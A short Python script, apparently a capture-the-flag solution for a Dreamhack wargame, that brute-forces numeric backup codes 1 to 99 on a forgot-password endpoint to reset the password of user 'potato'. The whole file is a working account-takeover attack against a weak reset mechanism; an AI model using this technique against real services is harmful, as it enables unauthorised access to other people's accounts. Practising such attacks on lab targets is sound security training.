import requests

PORT = 16909
URL = f"http://host1.dreamhack.games:{PORT}/forgot_password"

targetUserID = "potato"
targetUserPassword = "potato"

for backupCode in range(1, 100):

    queryData = {'userid':targetUserID, 'newpassword':targetUserPassword, 'backupCode':backupCode}

    response = requests.post(URL, data=queryData)

    if response.status_code == 500:
        print(f"[-]BackupCode {backupCode} 500 Error({queryData}). Try next...")
    else:
        print(f"[*]BackupCode {backupCode} **NOT** 500 Error({queryData}). Check out!")
        print(response)
        break
